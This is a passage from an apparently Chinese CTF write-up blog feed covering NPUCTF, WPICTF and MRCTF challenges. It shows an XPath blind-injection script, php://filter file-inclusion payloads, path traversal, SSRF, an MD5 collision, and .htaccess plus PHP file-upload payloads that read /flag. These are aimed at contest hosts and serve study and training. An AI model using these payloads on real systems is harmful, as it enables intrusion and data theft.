class="line">            <span class="comment"># payload = "' or substring(name(%s), %d, 1)='%s' or '1" % (s_payload, x, s)</span></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x = x - <span class="number">1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html = res.text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'非法操作'</span> <span class="keyword">in</span> html:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span>:</span><br><span class="line">            result += s</span><br><span class="line">            print(result)</span><br><span class="line">        x = x + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_root</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload = <span class="string">"/*[1]"</span></span><br><span class="line">    root = search(s_payload)</span><br><span class="line">    print(root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">self_define</span><span class="params">(strs)</span>:</span></span><br><span class="line">    s_payload = <span class="string">'%s'</span> % strs</span><br><span class="line">    tables = search(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># get_root()  #root</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]")  #accounts</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]") # user</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]/*[1]")  #id</span></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]/*[2]")  #usernmae</span></span><br><span class="line">    <span class="comment"># self_define("/root/accounts/*[1]/*[3]")  #password</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]/*[1]/*[2]/text()") #guest</span></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]/*[1]/*[3]/text()")  #e10adc3949ba59abbe56e057f20f883e</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># self_define("/root/*[1]/*[2]/*[2]/text()")  #adm1n</span></span><br><span class="line">    self_define(<span class="string">"/root/*[1]/*[2]/*[3]/text()"</span>)  <span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f</span></span><br></pre></td></tr></table></figure><p>将密码解码得到 guest/123456. Adm1n/gtfly123</p><p>发现链接是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;welcome</span><br></pre></td></tr></table></figure><p>常见的文件包含形式,读取welcom源码，发现过滤了php,base，大写绕过即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?file&#x3D;Php:&#x2F;&#x2F;filter&#x2F;convert.Base64-encode&#x2F;resource&#x3D;welcome</span><br></pre></td></tr></table></figure><p>得到提示，flag is  in /flag</p><p>读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：?file&#x3D;Php:&#x2F;&#x2F;filter&#x2F;convert.Base64-encode&#x2F;resource&#x3D;&#x2F;flag</span><br></pre></td></tr></table></figure><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Classical-Cipher"><a href="#Classical-Cipher" class="headerlink" title="Classical Cipher"></a>Classical Cipher</h2><p>打开文件，key.txt内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解密后的flag请用flag&#123;&#125;包裹</span><br><span class="line"></span><br><span class="line">压缩包密码：gsv_pvb_rh_zgyzhs</span><br><span class="line"></span><br><span class="line">对应明文：   ***_key_**_******</span><br></pre></td></tr></table></figure><p>目测凯撒，或者维吉尼亚密码，丢进quipquip，得到密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the_key_is_atbash</span><br></pre></td></tr></table></figure><p>之后是一张图片</p><p>j  pplj j  k</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h2 id=&quot;验证🐎&quot;&gt;&lt;a href=&quot;#验证🐎&quot; class=&quot;headerlink&quot; title=&quot;验证🐎&quot;&gt;&lt;/a&gt;验证🐎&lt;/h2&gt;&lt;p&gt;给了源码&lt;/p&gt;
    
    </summary>
    
    
      <category term="刷题记录" scheme="https://sunny250.github.io/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="NPUCTF" scheme="https://sunny250.github.io/tags/NPUCTF/"/>
    
      <category term="xpath注入" scheme="https://sunny250.github.io/tags/xpath%E6%B3%A8%E5%85%A5/"/>
    
      <category term="利用文件包含+php临时缓存拿shell" scheme="https://sunny250.github.io/tags/%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-php%E4%B8%B4%E6%97%B6%E7%BC%93%E5%AD%98%E6%8B%BFshell/"/>
    
  </entry>
  
  <entry>
    <title>wpictf2020-wp</title>
    <link href="https://sunny250.github.io/2020/04/18/wpictf2020-wp/"/>
    <id>https://sunny250.github.io/2020/04/18/wpictf2020-wp/</id>
    <published>2020-04-18T09:07:25.000Z</published>
    <updated>2020-04-18T09:07:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="Suckmore-Shell-2-0"><a href="#Suckmore-Shell-2-0" class="headerlink" title="Suckmore Shell 2.0"></a>Suckmore Shell 2.0</h2><p>题目给出了ssh服务器连接上后export不能用了</p><a id="more"></a><p>Cat、tac、less等之类都能用后面发现od可以使用. <a href="https://www.cnblogs.com/ur10ser/p/7624367.html" target="_blank" rel="noopener">参考链接</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sx@kali blog % ssh smsh@smsh.wpictf.xyz</span><br><span class="line">Password: </span><br><span class="line">&gt; ls</span><br><span class="line">flag</span><br><span class="line">      </span><br><span class="line">&gt; </span><br><span class="line">&gt; od -c flag</span><br><span class="line">0000000   e   c   h   o       <span class="string">"   W   P   I   &#123;   S   U   c   k   m   o</span></span><br><span class="line"><span class="string">0000020   r   e   S   o   f   t   w   a   r   e   N   3   3   d   z   2</span></span><br><span class="line"><span class="string">0000040   G   3   T   i   t   T   o   g   e   T   H   E   R   &#125;   "</span>  \n</span><br><span class="line">0000060</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="👉😎👉"><a href="#👉😎👉" class="headerlink" title="👉😎👉"></a>👉😎👉</h2><p>这个题目给了一堆emoji</p><p><img src="/pic/147.png" alt=""></p><p>还给了一个网站</p><p><img src="/pic/148.png" alt=""></p><p>在attach中有存在ssrf</p><p><img src="/pic/149.png" alt=""></p><p>直接给出了flag， url填入<a href="http://storage.zoop/flag.txt即可" target="_blank" rel="noopener">http://storage.zoop/flag.txt即可</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WPI&#123;tH4nKs_z00m3r_jh0n50n&#125;</span><br></pre></td></tr></table></figure><h2 id="dorsia2"><a href="#dorsia2" class="headerlink" title="dorsia2"></a>dorsia2</h2><p>题目描述如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;us-east-1.linodeobjects.com&#x2F;wpictf-challenge-files&#x2F;dorsia.webm The second card.</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;dorsia2.wpictf.xyz:31337&#x2F;index.html or 31338 or 31339</span><br><span class="line"></span><br><span class="line">Firefox doesnt like the page... try chromium.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hint: flag in ~&#x2F;flag.txt</span><br></pre></td></tr></table></figure><p>在视频中第二张卡片的内容为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">69</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"GET /%s"</span>, &amp;a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"HTTP 200\r\n\r\n"</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>); </span><br><span class="line">execlp(<span class="string">"cat"</span>,a,a,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure><p>使用chrome浏览器访问，提示文本为发送。</p><p>使用nc/burp suite获取flag.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ncat dorsia2.wpictf.xyz 31337 </span><br><span class="line">GET /../flag.txt</span><br><span class="line">HTTP 200</span><br><span class="line"></span><br><span class="line">WPI&#123;1_H4VE_2_return_SOME_VIDE0TAP3S&#125;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/../flag.txt</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: dorsia2.wpictf.xyz:31337</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;linux&quot;&gt;&lt;a href=&quot;#linux&quot; class=&quot;headerlink&quot; title=&quot;linux&quot;&gt;&lt;/a&gt;linux&lt;/h1&gt;&lt;h2 id=&quot;Suckmore-Shell-2-0&quot;&gt;&lt;a href=&quot;#Suckmore-Shell-2-0&quot; class=&quot;headerlink&quot; title=&quot;Suckmore Shell 2.0&quot;&gt;&lt;/a&gt;Suckmore Shell 2.0&lt;/h2&gt;&lt;p&gt;题目给出了ssh服务器连接上后export不能用了&lt;/p&gt;
    
    </summary>
    
    
      <category term="日常刷题" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E5%88%B7%E9%A2%98/"/>
    
    
      <category term="ctf" scheme="https://sunny250.github.io/tags/ctf/"/>
    
      <category term="wp" scheme="https://sunny250.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>macos问题记录</title>
    <link href="https://sunny250.github.io/2020/04/05/macos%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://sunny250.github.io/2020/04/05/macos%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-04-05T10:25:59.000Z</published>
    <updated>2020-04-05T10:25:59.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="日常水文" scheme="https://sunny250.github.io/categories/%E6%97%A5%E5%B8%B8%E6%B0%B4%E6%96%87/"/>
    
    
      <category term="问题记录" scheme="https://sunny250.github.io/tags/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF-wp</title>
    <link href="https://sunny250.github.io/2020/03/27/MRCTF/"/>
    <id>https://sunny250.github.io/2020/03/27/MRCTF/</id>
    <published>2020-03-27T12:38:44.000Z</published>
    <updated>2020-03-27T12:38:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h2><p>打开题目就有源码</p><a id="more"></a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;4d316f88-95dd-4d3f-ad11-e41a47f4d4a6.node3.buuoj.cn&#x2F;?id&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A&amp;gg&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A</span><br></pre></td></tr></table></figure><p><img src="/pic/144.png" alt=""></p><h2 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h2><p>文件上传</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: d891b650-5a8b-4edc-89ca-303d041df9d1.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------400560856011615641723368312644</span><br><span class="line"><span class="attribute">Content-Length</span>: 458</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------400560856011615641723368312644</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename=".htaccess"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">#define height 12</span><br><span class="line">#define width 12</span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file "1.jpg"</span><br><span class="line">-----------------------------400560856011615641723368312644</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸é®å»ä¸</span><br><span class="line">-----------------------------400560856011615641723368312644--</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: d891b650-5a8b-4edc-89ca-303d041df9d1.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------29705509393397799580693485075</span><br><span class="line"><span class="attribute">Content-Length</span>: 383</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=d7c1fe298429b3461f3a252fc9625491</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------29705509393397799580693485075</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename="../../1.jpg"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a</span></span><br><span class="line">&lt;?php echo file_get_contents("/flag")?&gt;</span><br><span class="line">-----------------------------29705509393397799580693485075</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸é®å»ä¸</span><br><span class="line">-----------------------------29705509393397799580693485075--</span><br></pre></td></tr></table></figure><p>访问url/upload/9af352e703653f2467a045cde806bd86/1.jpg</p><p>即可得到flag</p><h2 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h2><p>查看源码，发现有一段js验证</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params">code</span>)</span>&#123;</span><br><span class="line">      hash = hex_md5(code);</span><br><span class="line">      <span class="keyword">return</span> hash;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> code = <span class="built_in">document</span>.getElementById(<span class="string">"vcode"</span>).value;</span><br><span class="line">      <span class="keyword">if</span> (code != <span class="string">""</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(hex_md5(code) == <span class="string">"0cd4da0223c0b280829dc3ea458d655c"</span>)&#123;</span><br><span class="line">          alert(<span class="string">"您通过了验证！"</span>);</span><br><span class="line">          <span class="built_in">window</span>.location = <span class="string">"./flag.php"</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          alert(<span class="string">"你的授权码不正确！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        alert(<span class="string">"请输入授权码"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>跟随到flag.php，提示记录了IP</p><p><img src="/pic/145.png" alt=""></p><p>加一个xff</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/flag.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:27983</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br></pre></td></tr></table></figure><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>打开就是源码，序列化漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span 